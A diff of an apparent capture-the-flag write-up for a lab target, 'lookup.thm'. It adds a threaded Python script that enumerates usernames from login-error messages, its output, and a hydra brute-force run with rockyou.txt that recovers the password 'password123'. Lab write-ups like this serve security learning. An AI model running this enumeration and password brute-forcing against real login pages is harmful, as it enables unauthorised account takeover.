@@ -133,7 +133,7 @@ def check_username(username):
         response = requests.post(url, data=data, headers=headers)
         # Check the response content
         if "Wrong password" in response.text:
-            return f"Username found: {username}"
+            return username  # Return just the username if found
         elif "wrong username" in response.text:
             return None  # Silent for wrong usernames
         else:
@@ -157,14 +157,35 @@ if __name__ == "__main__":
         max_workers = 50  # Adjust this based on your system and target server's limits (e.g., 10-100)
         print(f"Starting enumeration with {max_workers} concurrent threads...")
 
+        found_usernames = []
+        errors = []
+
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
             future_to_username = {executor.submit(check_username, username): username for username in usernames}
             for future in as_completed(future_to_username):
                 result = future.result()
-                if result:
-                    print(result)
+                username = future_to_username[future]  # In case needed for errors
+                if result is not None:
+                    if isinstance(result, str) and (result.startswith("[?]") or result.startswith("[!]")):
+                        errors.append(result)
+                        print(result)  # Print errors immediately for visibility
+                    else:
+                        found_usernames.append(result)
 
         print("Enumeration complete.")
+
+        if errors:
+            print("\nErrors encountered:")
+            for error in errors:
+                print(error)
+
+        if found_usernames:
+            print("\nFound usernames:")
+            for username in sorted(found_usernames):  # Sort alphabetically for better readability
+                print(username)
+        else:
+            print("\nNo usernames found.")
+
     except Exception as e:
         print(f"[!] An error occurred: {e}")
 ```
@@ -172,13 +193,40 @@ save this script with userenum.py
 and give execute permision run with
 
 ```bash
-python userenum.py
+                                                                                                                                    
+┌──(root㉿prime)-[~/playground]
+└─# python userenum.py
+[?] Unexpected response for username: zylen
+[?] Unexpected response for username: zandra
+[?] Unexpected response for username: zsazsa
+[?] Unexpected response for username: ziad
+[?] Unexpected response for username: zula
+
+Found usernames:
+admin
+jose
+                
+
+
 ```
 
-* `gobuster`
-* Browser manual testing
+now we have a valid username and then we can try for valid password using hydra 
+```bash
+┌──(root㉿prime)-[~/playground]
+└─# hydra -l jose -P /usr/share/wordlists/rockyou.txt  lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -V
 
----
+[ATTEMPT] target lookup.thm - login "jose" - pass "snuggles" - 1409 of 14344399 [child 10] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "preston" - 1410 of 14344399 [child 13] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "newcastle" - 1411 of 14344399 [child 8] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "austin1" - 1412 of 14344399 [child 0] (0/0)
+[ATTEMPT] target lookup.thm - login "jose" - pass "sniper" - 1413 of 14344399 [child 9] (0/0)
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-18 09:26:27
+
+
+```
+we get the username:jose and password:password123
 
 ## 🚪 Initial Access
 
